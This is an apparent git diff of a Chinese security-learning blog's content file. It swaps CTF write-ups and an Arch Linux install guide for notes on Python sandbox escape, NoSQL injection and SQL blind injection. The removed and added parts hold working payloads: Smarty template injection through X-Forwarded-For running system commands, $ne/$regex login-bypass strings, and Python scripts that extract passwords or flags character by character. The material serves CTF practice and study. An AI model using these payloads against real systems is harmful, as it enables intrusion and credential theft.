class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------4-----------&#x27;</span>)</span><br><span class="line"><span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)</span></span><br><span class="line"><span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;类很特殊，在内部定义了_module=sys.modules[&#x27;warnings&#x27;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub()._module.__builtins__</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                <span class="built_in">print</span>(i, f)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
 
-app = Flask(__name__)
-
-HOME_PAGE_HTML = &#39;&#39;&#39;
-&lt;!doctype html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;utf-8&quot;&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
-    &lt;title&gt;Flask Web Application&lt;/title&gt;
-    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;div class=&quot;container mt-5&quot;&gt;
-    &lt;h1 class=&quot;display-4 text-center&quot;&gt;Welcome to My Flask App&lt;/h1&gt;
-    &lt;p class=&quot;lead text-center&quot;&gt;This is a simple web app using Flask.&lt;/p&gt;
-    &lt;div class=&quot;text-center&quot;&gt;
-        &lt;a href=&quot;/file?f=example.txt&quot; class=&quot;btn btn-primary&quot;&gt;Read example.txt&lt;/a&gt;
-    &lt;/div&gt;
-    &lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-&#39;&#39;&#39;
-
-@app.route(&#39;/&#39;)
-def index():
-    return render_template_string(HOME_PAGE_HTML)
-
-@app.route(&#39;/file&#39;)
-def file():
-    file_name = request.args.get(&#39;f&#39;)
-
-    if not file_name:
-        return &quot;Error: No file parameter provided.&quot;, 400
-
-    try:
-        with open(file_name, &#39;r&#39;) as file:
-            content = file.read()
-        return content
-    except FileNotFoundError:
-        return abort(404, description=&quot;File not found.&quot;)
-    except Exception as e:
-        return f&quot;Error reading file.&quot;, 500
-
-if __name__ == &#39;__main__&#39;:
-    app.run(host=&quot;127.0.0.1&quot;, port=8080)  
-</code></pre>
-<p>尝试读环境变量，查资料得知，Linux 系统存在如下敏感路径（在存在获取任意文件读时）</p>
-<pre><code>/etc/passwd
-</code></pre>
-<p>该文件储存了该 Linux 系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 Shell （以冒号作为分隔符）</p>
-<pre><code>/proc/self
-</code></pre>
-<p>proc 是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中数据。通过 &#x2F;proc&#x2F;PID 可以访问对应 PID 的进程内核数据，而 &#x2F;proc&#x2F;self  访问的是当前进程的内核数据。</p>
-<pre><code>/proc/self/cmdline
-</code></pre>
-<p>该文件包含的内容为当前进程执行的命令行参数。</p>
-<pre><code>/proc/self/mem
-</code></pre>
-<p>&#x2F;proc&#x2F;self&#x2F;mem 是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合 &#x2F;proc&#x2F;self&#x2F;maps 中的偏移地址进行读取。通过参数 start 和 end 及偏移地址值读取内容。</p>
-<pre><code>/proc/self/maps
-</code></pre>
-<p>&#x2F;proc&#x2F;self&#x2F;maps 包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。</p>
-<pre><code>flask-session结构
-</code></pre>
-<p> flask_session 是 flask 框架实现 session 功能的一个插件。其 session 结构分为三部分：序列化内容+时间+防篡改值，这三部分内容加密后以符号 “.”来进行分隔。flask_session 默认 session 的储存是在用户 Cookie 中。但也可以指定存储在数据库，缓存中间件，服务器本地文件等等之中。  </p>
-<p>查阅资料，得知 environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看 environ 目录来获取指定进程的环境变量信息  </p>
-<p>因此<code>/file?f=/proc/1/environ</code>读到flag  </p>
 <p>参考：</p>
 <blockquote>
-<p><a href="https://www.anquanke.com/post/id/241148">Proc 目录在 CTF 中的利用</a>  </p>
+<p><a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/">python 沙箱逃逸与SSTI</a>  </p>
 </blockquote>
 <blockquote>
-<p><a href="https://www.cnblogs.com/niyani/p/17074125.html">攻防世界-cat_cat_new（flask_session伪造、&#x2F;proc&#x2F;self&#x2F;文件夹）</a>  </p>
+<p><a href="https://ciphersaw.me/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/"> CTF Wiki Python沙箱逃逸 </a></p>
 </blockquote>
 <blockquote>
-<p><a href="https://www.runoob.com/flask/flask-layout.html">Flask 项目结构</a>  </p>
+<p><a href="https://github.com/H3rmesk1t/Security-Learning/blob/main/PythonSec/Python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94Python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/Python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94Python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8.md">Python安全学习—Python沙盒逃逸</a></p>
 </blockquote>
 <blockquote>
-<p><a href="https://xz.aliyun.com/t/15986?time__1311=GqjxcD2DnDRWDsD7zY0=GOQGCYy2Dw74rD">DASCTF 2024 十月挑战赛</a>  </p>
-</blockquote>
-<p>DASCTF十月赛其他题太过于抽象了 ~ <del>&gt;_&lt;</del> ~</p>
-<h2 id="CISCN2019-华东南赛区-Web11-1"><a href="#CISCN2019-华东南赛区-Web11-1" class="headerlink" title="[CISCN2019 华东南赛区] Web11 1"></a>[CISCN2019 华东南赛区] Web11 1</h2><p>刚刚进入实例,一时不知所措  </p>
-<p>后面看到XFF </p>
-<p>使用BP抓包,没发现什么特别的  </p>
-<p>在页面底部发现一行字：Build With Smarty !  </p>
-<p>查阅资料得知,   Smarty 是 PHP 的模板引擎，有助于将表示 (HTML&#x2F;CSS) 与应用程序逻辑分离。在 3.1.42 和 4.0.2 版本之前，模板作者可以通过制作恶意数学字符串来运行任意 PHP 代码。如果数学字符串作为用户提供的数据传递给数学函数，则外部用户可以通过制作恶意数学字符串来运行任意 PHP 代码。用户应升级到版本 3.1.42 或 4.0.2 以接收补丁。  </p>
-<blockquote>
-<p><a href="https://xz.aliyun.com/t/11085?time__1311=Cq0x2Qi=omqYqGNDQie7IK0IbbbmOa4D">CVE-2021-29454——Smarty模板注入</a>  </p>
-</blockquote>
-<p>所以我们可以尝试注入如下代码:</p>
-<pre><code>string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;
-</code></pre>
-<p>但传递这个Payload需要注入点,这里只有XFF可以入手  </p>
-<p>BP这样写:  </p>
-<pre><code>GET / HTTP/1.1
-Host: node5.buuoj.cn:25829
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-DNT: 1
-Sec-GPC: 1
-Connection: close
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
-X-Forwarded-For: string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;
-Content-Length: 2
-</code></pre>
-<p>发送两次,发现读到环境变量,代码执行成功  </p>
-<p>然后XFF传递<code>string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+eval(system(&#39;ls /&#39;));&quot;,$s)&#125;</code>  </p>
-<pre><code>bin
-dev
-etc
-flag
-home
-lib
-media
-mnt
-opt
-proc
-root
-run
-sbin
-srv
-sys
-usr
-var
-</code></pre>
-<p>读到存在flag目录,直接 cat &#x2F;flag  </p>
-<p>XFF payload: <code>string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+eval(system(&#39;cat /flag&#39;));&quot;,$s)&#125;</code>  </p>
-<p>得到flag  </p>
-<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h2><p>IDA打开  </p>
-<p>main函数中似乎没有什么有用的东西  </p>
-<p>点击菜单栏的“View”（视图）&gt;“Open subviews”（打开子视图）&gt;“Strings”（字符串）打开字符串窗口  </p>
-<p>发现<code>BJD&#123;%d%d2069a45792d233ac&#125;</code>,跟进看看</p>
-<pre><code>INT_PTR __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)
-&#123;
-CHAR String[100]; // [esp+0h] [ebp-64h] BYREF
-
-if ( a2 != 272 )
-&#123;
-    if ( a2 != 273 )
-    return 0;
-    if ( (_WORD)a3 != 1 &amp;&amp; (_WORD)a3 != 2 )
-    &#123;
-    sprintf(String, Format, ++dword_4099F0);
-    if ( dword_4099F0 == 19999 )
-    &#123;
-        sprintf(String, &quot; BJD&#123;%d%d2069a45792d233ac&#125;&quot;, 19999, 0);
-        SetWindowTextA(hWnd, String);
-        return 0;
-    &#125;
-    SetWindowTextA(hWnd, String);
-    return 0;
-    &#125;
-    EndDialog(hWnd, (unsigned __int16)a3);
-&#125;
-return 1;
-&#125;  
-</code></pre>
-<p>这里判断是否点击次数是19999次，Format 点进去是‘您已经点了 %d 次’，说明dword_4099F0存的是点击次数。然后判断是否点击19999次，输出BJD{1999902069a45792d233ac}</p>
-<p>说明flag是BJD{1999902069a45792d233ac} </p>
-<p>参考：</p>
-<blockquote>
-<p><a href="https://www.cnblogs.com/Tree-24/p/17311980.html">[BJDCTF2020]JustRE</a></p>
+<p><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E9%81%8D%E5%8E%86%E6%89%BE%E5%88%B0%E5%85%B6%E4%BB%96%E7%9A%84%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95">Python沙箱逃逸总结</a></p>
 </blockquote>
 ]]></content>
       <tags>
@@ -740,179 +545,117 @@ return 1;
       </tags>
   </entry>
   <entry>
-    <title>archlinux</title>
-    <url>/posts/49ae7cb9/</url>
-    <content><![CDATA[<h1 id="安装了下arch双系统，真不好安啊，现把所有需要用到的代码写在这"><a href="#安装了下arch双系统，真不好安啊，现把所有需要用到的代码写在这" class="headerlink" title="安装了下arch双系统，真不好安啊，现把所有需要用到的代码写在这"></a>安装了下arch双系统，真不好安啊，现把所有需要用到的代码写在这</h1><h2 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a>前期准备：</h2><pre><code>1.制作好系统盘，在制作系统盘时需注意分区类型使用GPT，然后在主板关闭安全启动  
-2开机时使用U盘启动 
+    <title>NoSQL</title>
+    <url>/posts/f0940727/</url>
+    <content><![CDATA[<h1 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h1><h3 id="意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下"><a href="#意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下" class="headerlink" title="意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下"></a>意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下</h3><h4 id="什么是NoSQL？"><a href="#什么是NoSQL？" class="headerlink" title="什么是NoSQL？"></a>什么是NoSQL？</h4><p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p>
+<p>大多数遇到的NoSQL注入，其采用的数据库都是MongoDB。</p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/9908?time__1311=n4+xnD0DuDRDci730=D/iaRWEDBn=QIIDRORYTD#toc-12">读这里详细了解MongoDB</a></p>
+</blockquote>
+<h4 id="NoSQL-注入的分类"><a href="#NoSQL-注入的分类" class="headerlink" title="NoSQL 注入的分类"></a>NoSQL 注入的分类</h4><h5 id="有两种-NoSQL-注入分类的方式："><a href="#有两种-NoSQL-注入分类的方式：" class="headerlink" title="有两种 NoSQL 注入分类的方式："></a>有两种 NoSQL 注入分类的方式：</h5><p>第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。</p>
+<p>第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。</p>
+<pre><code>重言式注入
 </code></pre>
-<h2 id="无线网卡连接网络（有线可以略过）"><a href="#无线网卡连接网络（有线可以略过）" class="headerlink" title="无线网卡连接网络（有线可以略过）"></a>无线网卡连接网络（有线可以略过）</h2><pre><code>1.iwctl 
-2.device list (列出所有WIFI设备) 
-3.station [网卡名称] scan (扫描网络)  
-4.station [网卡名称] get-networks (显示所有网络)  
-5.station [网卡名称] connect [WIFI名称] 
-输入密码
-Ctrl  + d 退出  
-ping一下看看是否连接到网络  （ping www.baidu.com）  
+<p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
+<pre><code>联合查询注入
 </code></pre>
-<h2 id="连上网后，更新系统时间"><a href="#连上网后，更新系统时间" class="headerlink" title="连上网后，更新系统时间"></a>连上网后，更新系统时间</h2><blockquote>
-<p>1.timedatectl (更新系统时间)  </p>
-</blockquote>
-<h2 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h2><h3 id="分区-1"><a href="#分区-1" class="headerlink" title="分区"></a>分区</h3><pre><code>1.fdisk -l (查看自己分区)  
-找到我们要安装的硬盘，单 nvme 盘为 /dev/nvme0n1;单 sata 盘为 /dev/sda1  
-2.cfdisk + [你的硬盘] 
-3.Type 选择第一个 efi system  
-4.Write 
-5.选中分出来的空间，选择 new，创建根分区，输入分区大小（不小于22G）
-5.选中剩下的空余空间，选择new ，创建 home 分区，输入分区大小  
-6.选中剩下的空余空间，选择 new ,创建 swap 交换空间 （类似于 win 的虚拟内存）  
-7.Sort 排下序  
-8.选中 home 分区，Type 选择 linux home  
-9.选中 swap 分区，Type 选择 linux swap  
-10.Write 写入
-11.Quit 退出  
-12.再次执行 fdisk -l 看看是否分好  
+<p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
+<pre><code>JavaScript 注入
 </code></pre>
-<h3 id="格式化分区"><a href="#格式化分区" class="headerlink" title="格式化分区"></a>格式化分区</h3><pre><code>1.mkfs.[文件系统] （-f）/dev/[分区编号]
-例： mkfs.btrfs -f /dev/nvme0n1p4 
-    mkfs.ext4 /dev/nvme0n1p4  
-2.mkfs.btrfs -f /dev/nvme0n1p5 (格式化 home 分区)  
-3.mkswap /dev/nvme0n1p6 (初始化swap分区)  
+<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
+<pre><code>盲注
 </code></pre>
-<h3 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h3><pre><code>一定要先挂载根分区  
-1.mount /dev/[根分区编号] /mnt  
-例：mount /dev/nvme0n1p4 /mnt  
-2.mount --mkdir /dev/[home分区编号] /mnt/home （挂载根分区）
-3.mount --mkdir /dev/[efi分区编号] /mnt/efi  （挂载efi分区）  
-例：mount --mkdir /dev/nvme0n1p1 /mnt/efi  
-4.swapon /dev/[交换空间分区编号] （挂载交换分区）  
+<p>当页面没有回显时，那么我们可以通过 $regex 正则表达式来达到和传统 SQL 注入中 substr() 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
+<p>常见的NoSQL为PHP中的NoSQL和Node.js中的NoSQL  </p>
+<h5 id="PHP-中的NoSQL注入"><a href="#PHP-中的NoSQL注入" class="headerlink" title="PHP 中的NoSQL注入"></a>PHP 中的NoSQL注入</h5><p>重言式注入：</p>
+<p>重言式注入通常也是判断是否为NoSQL的第一步。<br>我们需要用$ne关键字构造永真条件来完成NoSQL注入</p>
+<pre><code>username[$ne]=1&amp;password[$ne]=1
 </code></pre>
-<h2 id="配置国内镜像源"><a href="#配置国内镜像源" class="headerlink" title="配置国内镜像源"></a>配置国内镜像源</h2><pre><code>1.nano /etc/pacman.d/mirrorlist  
-2.在第一行添加
-Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch  
-3.Ctrl + o 保存
-4.Ctrl + x 退出  
-5.pacman -Syy (刷新)  
-6.pacman -S archlinux-keyring (重新安装密钥)  
+<p>最后如果数据库没有进行任何过滤的话，这里就会输出所有的用户名和用户密码<br>这里的原理是，$ne关键字在MongoDB查询语句中意思是不等于，也就是说我们上传了一个永真条件，使得登陆成功，但是服务端查不到username是1，password也是1的账户，只能输出所有的账户</p>
+<p>所以我们也可以使用以下的payload：</p>
+<pre><code>username[$ne]=&amp;password[$ne]=
+username[$gt]=&amp;password[$gt]=
+username[$gte]=&amp;password[$gte]=
 </code></pre>
-<h2 id="安装基本系统"><a href="#安装基本系统" class="headerlink" title="安装基本系统"></a>安装基本系统</h2><pre><code>1.pacstrap /mnt [软件包]  
-base （基础系统），base-devel (工具包) 
+<p>JavaScript注入：</p>
+<p>MongoDB Server 是支持 JavaScript 的，可以使用 JavaScript 进行一些复杂事务和查询，也允许在查询的时候执行 JavaScript 代码。但是如果传递不干净的用户输入到这些查询中，则可能会注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
+<p>要想使用JS注入，我们需要了解一下$where操作符。</p>
+<p>在MongoDB中，可以通过$where操作符直接执行JavaScript代码如下实例：</p>
+<blockquote>
+<p>db.users.find({ $where: “function(){return(this.username &#x3D;&#x3D; ‘whoami’)}” })<br>{ “_id” : ObjectId(“60fa9c80257f18542b68c4b9”), “username” : “whoami”, “password” : “657260” }</p>
+</blockquote>
+<p>由于使用了 $where 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami 的数据。</p>
+<p>某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 $userData 获取查询条件：</p>
+<pre><code>db.users.find(&#123; $where: &quot;function()&#123;return(this.username == $userData)&#125;&quot; &#125;)
 </code></pre>
-<p>例：</p>
-<pre><code>pacstrap /mnt base base-devel linux-zen linux-zen-headers linux-firmware networkmanager grub os-prober efibootmgr ntfs-3g amd-ucode bluez bluez-utils nano  
+<p>然后，攻击者可能会注入一种恶意的字符串如 ‘a’; sleep(5000) ，此时 MongoDB 执行的查询语句为：</p>
+<pre><code>db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#39;a&#39;; sleep(5000))&#125;&quot; &#125;)
 </code></pre>
-<p>一路回车就可以  </p>
-<h2 id="创建-fstab-自动挂载配置文件"><a href="#创建-fstab-自动挂载配置文件" class="headerlink" title="创建 fstab (自动挂载配置文件)"></a>创建 fstab (自动挂载配置文件)</h2><blockquote>
-<p>1.genfstab -U &#x2F;mnt &gt;&gt; &#x2F;mnt&#x2F;etc&#x2F;fstab  </p>
+<p>如果此时服务器有 5 秒钟的延迟则说明注入成功。<br>值得注意的是，在 MongoDB 2.4 之前，通过 $where 操作符使用<em>map-reduce</em>、<em>group</em> 命令可以访问到 Mongo Shell 中的全局函数和属性，如<em>db</em>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。<br>在MongoDB 2.4 之后<em>db</em>访问不到了，但还是可以构造万能密码查出用户信息</p>
+<p>布尔盲注：<br>当页面没有回显的时候可以使用$regex正则表达式来进行盲注，$regex可以达到和传统SQL注入中substr()函数相同的功能。</p>
+<p>和传统SQL注入一样，在已知用户名的情况下，我们需要知道密码长度。可以使用</p>
+<blockquote>
+<p>username&#x3D;admin&amp;password[$regex]&#x3D;.[4] (“[]”中的数字可以更改来确定密码长度，如果[4]为真，[5]为假，则密码为4位)  </p>
 </blockquote>
-<h2 id="chroot进入系统"><a href="#chroot进入系统" class="headerlink" title="chroot进入系统"></a>chroot进入系统</h2><blockquote>
-<p>1.arch-chroot &#x2F;mnt </p>
+<h5 id="Node-js中的MongoDB注入"><a href="#Node-js中的MongoDB注入" class="headerlink" title="Node.js中的MongoDB注入"></a>Node.js中的MongoDB注入</h5><p>Node.js中的MongoDB注入主要是重言式注入，通过构造永真式万能密码实现登录绕过<br>另外，如果过滤了$ne关键字可以使用Unicode编码绕过。<br>在这里贴一个布尔盲注用于爆密码的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">password = &#x27;&#x27;</span><br><span class="line">url = &#x27;http://node4.buuoj.cn:27409/login.php&#x27;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:</span><br><span class="line"></span><br><span class="line">            # When the method is GET</span><br><span class="line">            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)</span><br><span class="line">            # When the method is POST</span><br><span class="line">            post_payload = &#123;</span><br><span class="line">                &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c</span><br><span class="line">            &#125;</span><br><span class="line">            # When the method is POST with JSON</span><br><span class="line">            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)</span><br><span class="line">            headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span><br><span class="line">            r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json</span><br><span class="line"></span><br><span class="line">            #r = requests.post(url=url, data=post_payload)</span><br><span class="line">            if &#x27;但没完全登录&#x27; in r.content.decode():</span><br><span class="line">                print(&quot;[+] %s&quot; % (password + c))</span><br><span class="line">                password += c</span><br><span class="line"></span><br><span class="line"># 输出:</span><br><span class="line"># [+] 4</span><br><span class="line"># [+] 42</span><br><span class="line"># [+] 422</span><br><span class="line"># [+] 4227</span><br><span class="line"># [+] 42276</span><br><span class="line"># [+] 422766</span><br><span class="line"># ......</span><br><span class="line"># [+] 42276606202db06ad1f29ab6b4a1</span><br><span class="line"># [+] 42276606202db06ad1f29ab6b4a13</span><br><span class="line"># [+] 42276606202db06ad1f29ab6b4a130</span><br><span class="line"># [+] 42276606202db06ad1f29ab6b4a1307</span><br><span class="line"># [+] 42276606202db06ad1f29ab6b4a1307f</span><br></pre></td></tr></table></figure>
+<h1 id="关于Linux中的管道符"><a href="#关于Linux中的管道符" class="headerlink" title="关于Linux中的管道符 |"></a>关于Linux中的管道符 |</h1><p>管道符在以前RCE的时候也见到过但是没有进行系统研究，最近刷题的时候又遇到了，所以在这里记录一下<br>使用|可以将两个命令分隔开来，同时管道符左边命令的输出可以作右边命令的输入<br>因此在遇到一些已经可以执行命令（比如Ping）的靶机上，通过|连接cat或find或grep命令来找到flag</p>
+<h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><p>MD5绕过真是五花八门，ffifdyop和129581926211651571912466741651878684928可用于SQL注入时语句经过MD5加密之后的绕过，其原理是：提交的字符串经过加密形成的16进制字符串转换成10进制数字后对应的asii表内容为：‘ or ‘ 6……。<br>另外，数组绕过还可以绕过<em>if($_POST[‘param1’]!&#x3D;&#x3D;$_POST[‘param2’]&amp;&amp;md5($_POST[‘param1’])&#x3D;&#x3D;&#x3D;md5($_POST[‘param2’]))</em></p>
+<h1 id="SQL布尔盲注"><a href="#SQL布尔盲注" class="headerlink" title="SQL布尔盲注"></a>SQL布尔盲注</h1><p>第一次在题目中遇到布尔盲注，所以在这里记录一下<br>题目：</p>
+<blockquote>
+<p><a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World">[CISCN2019 华北赛区 Day2 Web1]Hack World<br>1</a> </p>
 </blockquote>
-<h2 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h2><h3 id="设置时区-1"><a href="#设置时区-1" class="headerlink" title="设置时区"></a>设置时区</h3><blockquote>
-<p>1.ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime  </p>
-</blockquote>
-<h3 id="设置硬件时间"><a href="#设置硬件时间" class="headerlink" title="设置硬件时间"></a>设置硬件时间</h3><blockquote>
-<p>1.hwclock –systohc </p>
-</blockquote>
-<h2 id="本地化"><a href="#本地化" class="headerlink" title="本地化"></a>本地化</h2><h3 id="编辑locale-gen"><a href="#编辑locale-gen" class="headerlink" title="编辑locale.gen"></a>编辑locale.gen</h3><pre><code>1.nano /etc/locale.gen &#123;删除 en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8 前的&quot;#&quot;&#125; 
-2.locale-gen (生成locale)  
+<p>我一开始怀疑是NoSQL（因为题目提示是SQL注入，PHP），结果尝试username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1发现已经被过滤了。遂尝试普通的SQL注入<br>输入*1’ or 1&#x3D;1 –+<em>和</em>1;show databases();#*发现均被过滤，而输入1和2的时候登陆成功，输入3以上的数字以及字母都会报错（回显bool flase）<br>所以猜测这里需要布尔盲注，同时屏蔽了关键词<br>尝试Fuzz一下看看屏蔽了哪些关键词</p>
+<pre><code>这里粘贴一些用于Fuzz的字典
+https://github.com/Underwood12/FuzzDict
+这是Fuzz教程  
+https://www.bilibili.com/video/BV1Zs42137tf
 </code></pre>
-<h3 id="编辑locale-conf"><a href="#编辑locale-conf" class="headerlink" title="编辑locale.conf:"></a>编辑locale.conf:</h3><blockquote>
-<p>1.nano &#x2F;etc&#x2F;locale.conf  {添加 LANG&#x3D;en_US.UTF-8}  </p>
+<p>题目给库名和表名都是flag<br>所以用<em>id&#x3D;0^(ascii(substr((select(flag)from(flag)),1,1))&gt;101)</em><br>来查询，由于当&gt;102的时候报错，说明第一个字符就是102的ascii所对应的字符，也就是f<br>然后使用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://bdff4bff-23c2-43c2-969e-74bedf958792.node3.buuoj.cn/index.php&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">num = 0  # 用了来判断是不是flag已经拼完整了</span><br><span class="line">for i in range(1, 60):</span><br><span class="line"></span><br><span class="line">    if num == 1:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    for j in range(32, 128):</span><br><span class="line"></span><br><span class="line">        payload = &quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot; % (i, j)</span><br><span class="line">        # print(str((i-1)*96+j-32)+&quot;:~&quot;+payload+&quot;~&quot;)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;id&quot;: payload,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line"></span><br><span class="line">        if &quot;Hello&quot; in r.text:</span><br><span class="line">            x = chr(j)</span><br><span class="line">            result += str(x)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line"></span><br><span 